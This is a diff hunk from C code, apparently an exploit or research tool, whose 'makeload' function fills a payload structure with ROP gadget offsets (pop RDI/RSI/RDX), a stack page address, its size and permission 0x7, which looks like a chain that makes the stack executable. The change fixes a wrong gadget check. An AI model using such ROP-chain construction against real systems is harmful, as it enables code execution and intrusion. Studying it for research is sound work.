@@ -34,7 +34,7 @@ ssize_t makeload(PayloadPtr plp, BaseAddressesPtr baseAddressesPtr, char *p, ssi
 	plp->pl_rbp.o		= indirectToOffset(&plp->pl_rbp, 'B', baseAddressesPtr);
 	plp->pl_popRDI.o	= libc_popRDI?pointerToOffset(libc_popRDI, 'L', baseAddressesPtr):pointerToOffset(&&l_popRDI, 'P', baseAddressesPtr);
 	plp->pl_stackPage.o	= pointerToOffset(baseAddressesPtr->stack_base, 'S', baseAddressesPtr);
-	plp->pl_popRSI.o	= libc_popRDI?pointerToOffset(libc_popRSI, 'L', baseAddressesPtr):pointerToOffset(&&l_popRSI, 'P', baseAddressesPtr);
+	plp->pl_popRSI.o	= libc_popRSI?pointerToOffset(libc_popRSI, 'L', baseAddressesPtr):pointerToOffset(&&l_popRSI, 'P', baseAddressesPtr);
 	plp->pl_stackSize	= getpagesize();
 	plp->pl_popRDX.o	= libc_popRDX?pointerToOffset(libc_popRDX, 'L', baseAddressesPtr):pointerToOffset(&&l_popRDX, 'P', baseAddressesPtr);
 	plp->pl_permission	= 0x7;
